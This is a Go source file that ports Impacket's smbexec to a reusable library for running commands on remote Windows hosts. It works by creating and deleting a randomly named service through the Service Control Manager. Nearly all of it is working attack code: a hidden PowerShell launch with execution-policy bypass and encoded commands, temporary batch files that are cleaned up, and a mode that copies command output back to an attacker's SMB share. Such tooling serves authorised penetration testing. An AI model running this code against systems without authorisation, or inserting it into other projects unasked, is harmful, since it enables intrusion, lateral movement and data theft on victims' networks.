// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     https://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

// Package smbexec implements remote command execution against a Windows host
// via the Service Control Manager (SVCCTL) over the svcctl named pipe. It
// mirrors Impacket's smbexec.py: a one-shot Windows service is created with
// the command line as its binary path, started (which fails by design - the
// "service" is just the command), and immediately deleted.
//
// The package is split from cmd/smbexec so other Go projects can drive the
// same logic without forking the CLI.
//
// Two output retrieval modes are supported, mirroring Impacket:
//
//   - ModeShare (default): the command redirects its stdout/stderr to a file
//     on a writable share on the target (default C$). The caller's already-
//     authenticated SMB client tails the file via SMB.
//   - ModeServer: the command additionally `copy`s the output file back to a
//     UNC path on the attacker (typically a local impacket-smbserver instance
//     listening on TCP/445). The caller is responsible for spinning that up.
//
// PowerShell shells are supported via UTF-16LE Base64 encoding (-Enc) so that
// command lines with metacharacters survive the cmd.exe wrapper.
package smbexec

import (
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"strings"
	"time"
	"unicode/utf16"

	"github.com/Mzack9999/goimpacket/pkg/dcerpc/svcctl"
	"github.com/Mzack9999/goimpacket/pkg/smb"
)

// Mode selects the output-retrieval mechanism.
type Mode string

const (
	// ModeShare polls the output file via SMB on a writable share on the
	// target (default C$). Requires no extra infrastructure on the caller.
	ModeShare Mode = "SHARE"

	// ModeServer additionally copies the output file back to the caller via
	// a UNC \\<localIP>\<share>\... path. The caller must run a local
	// SMB server (e.g. impacket-smbserver) to receive it.
	ModeServer Mode = "SERVER"
)

// DefaultShellPrefix is the cmd.exe wrapper prepended to user commands.
const DefaultShellPrefix = "%COMSPEC% /Q /c "

// Options configure a single Exec invocation.
type Options struct {
	// Share is the writable share that holds the captured output file.
	// Defaults to "C$" (Impacket smbexec.py default).
	Share string

	// Mode selects SHARE (default) or SERVER output retrieval.
	Mode Mode

	// ServiceName is the name of the registered Windows service. If empty,
	// a random 8-char alphanumeric string is generated.
	ServiceName string

	// OutputFile is the basename of the captured output file written into
	// Share. If empty, a random "__output_<rand>" name is generated.
	// Callers running concurrent Exec calls against the same host should
	// leave it empty so each call gets a unique file.
	OutputFile string

	// ShellType selects the wrapper. "cmd" (default) or "powershell".
	// PowerShell commands are UTF-16LE / Base64 encoded so metacharacters
	// survive the cmd.exe escape pass.
	ShellType string

	// NoOutput skips redirecting / polling for the output file.
	NoOutput bool

	// Timeout caps how long Exec polls for the output file. Default 30s.
	Timeout time.Duration

	// ServerLocalIP is the attacker IP reachable from the target. Required
	// when Mode == ModeServer; the command appends a `copy` to that UNC path.
	ServerLocalIP string

	// ServerShare is the share name exported by the caller's local SMB
	// server (default "TMP"). Used only in ModeServer.
	ServerShare string
}

// Result is the outcome of one Exec call.
type Result struct {
	// ServiceName is the (possibly random) Windows service name registered.
	ServiceName string
	// OutputFile is the basename of the captured output file under Share.
	// Empty when NoOutput is set.
	OutputFile string
	// Output is the captured stdout/stderr; empty on NoOutput / timeout.
	Output string
}

// Exec registers a one-shot Windows service whose binary is the supplied
// command line, starts it (start is expected to time out: the command runs
// to completion before the SCM gets a service-control response), polls for
// the output file via SMB, then deletes the service. The supplied
// ServiceController must already be bound to svcctl on the target. The
// supplied SMB client is required for ModeShare; ModeServer reuses it only
// for cleanup.
func Exec(sc *svcctl.ServiceController, smbClient *smb.Client, command string, opts Options) (*Result, error) {
	if sc == nil {
		return nil, fmt.Errorf("smbexec.Exec: ServiceController is required")
	}
	if smbClient == nil && opts.Mode != ModeServer {
		return nil, fmt.Errorf("smbexec.Exec: SMB client required for SHARE mode")
	}
	if command == "" {
		return nil, fmt.Errorf("smbexec.Exec: command cannot be empty")
	}

	share := opts.Share
	if share == "" {
		share = "C$"
	}
	mode := opts.Mode
	if mode == "" {
		mode = ModeShare
	}
	timeout := opts.Timeout
	if timeout <= 0 {
		timeout = 30 * time.Second
	}
	if mode == ModeServer && opts.ServerLocalIP == "" {
		return nil, fmt.Errorf("smbexec.Exec: SERVER mode requires ServerLocalIP")
	}
	serverShare := opts.ServerShare
	if serverShare == "" {
		serverShare = "TMP"
	}

	outputFile := opts.OutputFile
	if outputFile == "" && !opts.NoOutput {
		outputFile = "__output_" + generateRandomString(6)
	}
	svcName := opts.ServiceName
	if svcName == "" {
		svcName = generateRandomString(8)
	}

	// In SHARE mode, mount the share so Cat / Rm work in pollOutput.
	if mode == ModeShare && !opts.NoOutput {
		if err := smbClient.UseShare(share); err != nil {
			return nil, fmt.Errorf("use share %s: %w", share, err)
		}
	}

	wrapped := buildCommandLine(command, share, outputFile, opts.ShellType, mode, opts.ServerLocalIP, serverShare, opts.NoOutput)

	svcHandle, err := sc.CreateService(svcName, svcName, wrapped,
		svcctl.SERVICE_WIN32_OWN_PROCESS, svcctl.SERVICE_DEMAND_START, svcctl.ERROR_IGNORE)
	if err != nil {
		// 0x00000431 = ERROR_SERVICE_EXISTS - try a fresh name once.
		if strings.Contains(err.Error(), "0x00000431") {
			if h, openErr := sc.OpenService(svcName, svcctl.SERVICE_ALL_ACCESS); openErr == nil {
				_ = sc.DeleteService(h)
				_ = sc.CloseServiceHandle(h)
			}
			svcName = generateRandomString(8)
			svcHandle, err = sc.CreateService(svcName, svcName, wrapped,
				svcctl.SERVICE_WIN32_OWN_PROCESS, svcctl.SERVICE_DEMAND_START, svcctl.ERROR_IGNORE)
		}
		if err != nil {
			return nil, fmt.Errorf("create service: %w", err)
		}
	}

	// StartService is expected to time out: the "service" is the command
	// itself, so it never reports the SCM-style status. We always tear the
	// service down regardless.
	_ = sc.StartService(svcHandle)
	_ = sc.DeleteService(svcHandle)
	_ = sc.CloseServiceHandle(svcHandle)

	res := &Result{ServiceName: svcName, OutputFile: outputFile}
	if opts.NoOutput || mode == ModeServer {
		// In SERVER mode the caller polls its own local SMB server.
		return res, nil
	}
	res.Output = pollOutput(smbClient, outputFile, timeout)
	return res, nil
}

// buildCommandLine assembles the command-line baked into the Windows service
// binPath. Mirrors Impacket smbexec.py's _shell construction.
func buildCommandLine(userCommand, share, outputFile, shellType string, mode Mode, localIP, serverShare string, noOutput bool) string {
	shell := DefaultShellPrefix
	outputUNC := fmt.Sprintf("\\\\%%COMPUTERNAME%%\\%s\\%s", share, outputFile)
	batchFile := generateRandomString(8) + ".bat"

	var cmdline string

	switch strings.ToLower(shellType) {
	case "powershell":
		psCommand := "$ProgressPreference='SilentlyContinue';" + userCommand
		encoded := encodeUTF16LEBase64(psCommand)
		psPrefix := "powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc "
		batchContent := psPrefix + encoded
		if !noOutput {
			batchContent += " > " + outputUNC + " 2>&1"
		}
		cmdline = shell + "echo " + EscapeForEcho(batchContent) +
			" > %TEMP%\\" + batchFile + " & " +
			shell + "%TEMP%\\" + batchFile

	default: // "cmd" or empty
		// %COMSPEC% /Q /c echo (CMD) ^> OUTPUT 2^>^&1 > %TEMP%\BATCH & %COMSPEC% /Q /c %TEMP%\BATCH
		body := "echo (" + EscapeForEcho(userCommand) + ")"
		if !noOutput {
			body += " ^> " + outputUNC + " 2^>^&1"
		}
		cmdline = shell + body +
			" > %TEMP%\\" + batchFile + " & " +
			shell + "%TEMP%\\" + batchFile
	}

	if mode == ModeServer && !noOutput {
		// Append `copy <outputUNC> \\<localIP>\<serverShare>` so the target
		// pushes the captured output back to the attacker's SMB server.
		cmdline += " & copy " + outputUNC + " \\\\" + localIP + "\\" + serverShare
	}

	cmdline += " & del %TEMP%\\" + batchFile
	return cmdline
}

// pollOutput tails the captured output file via SMB until it appears or
// timeout expires. The file is removed on success.
func pollOutput(c *smb.Client, filename string, timeout time.Duration) string {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		time.Sleep(100 * time.Millisecond)
		content, err := c.Cat(filename)
		if err == nil && content != "" {
			_ = c.Rm(filename)
			return content
		}
		// STATUS_SHARING_VIOLATION = service still writing.
		// STATUS_OBJECT_NAME_NOT_FOUND = service hasn't started yet.
		// Anything else still falls through; some SMB servers emit transient
		// faults right after CreateService and we keep polling.
		_ = err
	}
	return ""
}

// EscapeForEcho escapes characters that have special meaning to cmd.exe's
// echo handler. The order matters: ^ is escaped first because it is the
// escape character itself.
func EscapeForEcho(s string) string {
	s = strings.ReplaceAll(s, "^", "^^")
	s = strings.ReplaceAll(s, "&", "^&")
	s = strings.ReplaceAll(s, "|", "^|")
	s = strings.ReplaceAll(s, "<", "^<")
	s = strings.ReplaceAll(s, ">", "^>")
	s = strings.ReplaceAll(s, "(", "^(")
	s = strings.ReplaceAll(s, ")", "^)")
	return s
}

// encodeUTF16LEBase64 encodes a string to UTF-16LE then Base64. This is the
// format expected by PowerShell's -EncodedCommand / -Enc.
func encodeUTF16LEBase64(s string) string {
	utf16Chars := utf16.Encode([]rune(s))
	bytes := make([]byte, len(utf16Chars)*2)
	for i, c := range utf16Chars {
		bytes[i*2] = byte(c)
		bytes[i*2+1] = byte(c >> 8)
	}
	return base64.StdEncoding.EncodeToString(bytes)
}

// generateRandomString returns a length-byte random alphanumeric string.
func generateRandomString(length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	b := make([]byte, length)
	_, _ = rand.Read(b)
	for i := range b {
		b[i] = chars[int(b[i])%len(chars)]
	}
	return string(b)
}
